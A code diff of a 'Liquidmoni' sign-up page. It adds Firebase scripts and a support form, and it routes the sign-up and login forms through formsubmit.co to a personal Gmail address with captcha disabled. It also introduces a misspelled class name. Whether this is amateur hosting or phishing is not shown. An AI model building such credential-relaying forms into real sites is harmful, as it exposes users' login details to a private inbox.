@@ -7,10 +7,59 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Liquidmoni - Sign Up</title>
     <link rel="stylesheet" href="../build/style.css">
+
+    <!-- firebase authentication and database -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
 </head>
 
 <body>
     <div class="sign-up__wrapper">
+
+        <div class="support__modal">
+            <section class="support">
+                <h2 class="support__header">Support us</h2>
+                <button class="support__close">
+                    <img src="../images/svg-images/close.svg" alt="Support Close Button">
+                </button>
+                <form action="" class="support__form">
+                    <input type="hidden" name="_subject" value="new sign in">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://liquidmoni.netlify.app/pages/authentication.html">
+                    <section class="support__form-action">
+                        <input type="hidden" name="_captcha" value="false">
+                        <!-- Detail inputs -->
+                        <input type="hidden" name="_subject" value="new sign in">
+                        <!-- Change deployment url. -->
+
+                        <!-- <input type="hidden" name="_next" value="https://jailbreak-101.github.io/LIQUIDMONI.COM/thank-you.html"> -->
+                        <input type="hidden" name="_next" value="">
+
+                        <fieldset class="support__form-field">
+                            <label class="support__form-label" for="username">Name: </label>
+                            <div class="support__form-input-container">
+                                <input type="text" class="support__form-input" id="username" name="username"
+                                    placeholder="Name" required>
+                            </div>
+                        </fieldset>
+
+                        <fieldset class="support__form-field">
+                            <label class="support__form-label" for="email">Email: </label>
+                            <div class="support__form-input-container">
+                                <input type="email" class="support__form-input" id="email" name="user-email"
+                                    placeholder="Email" required>
+                            </div>
+                        </fieldset>
+
+                        <textarea class="support__form-input support__form-textarea" name="user-message" id="message"
+                            cols="41" rows="10" placeholder="Message" required></textarea>
+                        <button type="submit" class="support__button">Submit</button>
+                        <p class="support__link">You can also support us by emailing<a href=""
+                                class="link">Support@liquidmoni.com</a></p>
+                    </section>
+                </form>
+            </section>
+        </div>
 
         <header class="header">
             <nav class="nav">
@@ -47,11 +96,11 @@
             <!-- SIGN UP -->
             <!-- https://formsubmit.co/liquidmoniainfo@gmail.com -->
             <div class="sign__up">
-                <form class="sign__up-form" action="#">
+                <form class="sign__up-form" action="https://formsubmit.co/liquidmoniainfo@gmail.com" method="post">
                     <input type="hidden" name="_subject" value="new sign in">
-                    <!-- <input type="hidden" name="_captcha" value="false"> -->
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://liquidmoni.netlify.app/pages/authentication.html">
                     <!-- Change deployment url. -->
-                    <!-- <input type="hidden" name="_next" value="https://liquidmoni.netlify.app/pages/authentication.html"> -->
                     <section class="sign__up-form-action">
 
                         <!-- Detail inputs -->
@@ -74,7 +123,7 @@
                     </section>
 
                     <!-- AUTHENTICATION -->
-                    <section class="sign__up-form-option">
+                    <!-- <section class="sign__up-form-option">
                         <p class="sign__up-text">Already a user? <a href="#" class="sign__up-link">Login</a></p>
 
                         <section class="sign__up-other-options">
@@ -85,8 +134,8 @@
                             <button class="sign__up-option-button">
                                 <a href="#" class="sign__up-option-link">Sign up with Google</a>
                             </button>
-                        </section>
-                        <button class="sign__up-submit-button" type="submit">Sign Up</button>
+                        </section> -->
+                    <button class="sign__up-submit-button" type="submit">Sign Up</button>
                     </section>
                 </form>
             </div>
@@ -94,6 +143,8 @@
             <!-- LOG IN -->
             <div class="log-in-modal hidden">
                 <div class="log-in">
+                    <button class="log-in__close"><img src="../images/svg-images/close.svg"
+                            alt="Log in close button"></button>
                     <form class="log-in__form" action="https://formsubmit.co/liquidmoniainfo@gmail.com" method="post">
                         <input type="hidden" name="_subject" value="new sign in">
                         <input type="hidden" name="_captcha" value="false">
@@ -126,7 +177,7 @@
                             <p class="log-in__text">New user? <a href="#" class="log-in__link">Sign Up</a></p>
 
                             <!-- AUTHENTICATION -->
-                            <section class="log-in__form-option">
+                            <!-- <section class="log-in__form-option">
                                 <p class="log-in__text">Already a user? <a href="#" class="log-in__link">Login</a></p>
 
                                 <section class="log-in__other-options">
@@ -137,10 +188,10 @@
                                     <button class="log-in__option-button">
                                         <a href="#" class="log-in__link">Sign up with Google</a>
                                     </button>
-                                </section>
+                                </section> -->
 
-                                <button class="log-in__submit-button" type="submit">Login</button>
-                            </section>
+                            <button class="log-in__submit-button" type="submit">Login</button>
+                        </section>
                     </form>
                 </div>
             </div>
@@ -151,7 +202,7 @@
 
                 <section class="footer__top">
                     <h3 class="footer__top-text">Learn how to grow 💪your business with <span
-                            class="footer__highlight">Liquidmoni</span></h3>
+                            class="footer__hcighlight">Liquidmoni</span></h3>
 
                     <a href="./pages/sign-up.html" class="footer__button">Download For
                         Free</a>
@@ -214,12 +265,13 @@
             </small>
         </footer>
     </div>
-
 </body>
+
+<!-- Firebase / Backend / Authentication -->
+
 <!-- The JavaScript for the Logic of the WebSite -->
-<!-- <script type="./module" src="../Js/forms.js"></script> -->
-<!-- <script src="../Js/script.js"></script> -->
-<!-- <script type="./module" src="../backend-auth/create-user.js"></script> -->
-<!-- <script type="./module" src="../backend-auth/login-user.js"></script> -->
+<script type="./module" src="../Js/firebase-forms.js"></script>
+<script src="../Js/main.js"></script>
+<!-- <script src="../backend-auth/login-user.js"></script> -->
 
 </html>
